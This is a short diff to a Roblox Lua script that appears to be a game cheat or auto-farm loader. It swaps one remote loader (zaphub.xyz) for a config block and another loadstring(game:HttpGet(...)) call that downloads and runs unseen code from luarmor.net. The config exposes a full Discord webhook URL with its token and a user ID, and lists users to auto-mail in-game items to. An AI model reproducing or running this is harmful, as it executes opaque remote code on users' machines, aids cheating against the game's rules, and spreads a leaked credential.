@@ -1,6 +1,12 @@
 repeat wait() until game:IsLoaded()
 task.spawn(function()
-loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+getgenv().Config = {
+    ["Webhook"] = "https://discord.com/api/webhooks/1361505261352915082/kkBoNKTLKMh9tkiytfADAMJOQfAc6O85cPhtm6RVAQoYYGEY7xwuh6dSNtv7dlBj1qLw",
+    ["UserID"] = "484739592239579136",
+    ["Instance"] = "Digsite", -- or AdvancedDigsite
+    ["AutoMailUsers"] = {"comer_item"}
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fe19d85877f65700134ca559ad130810.lua"))()
 end)
 
 task.spawn(function()
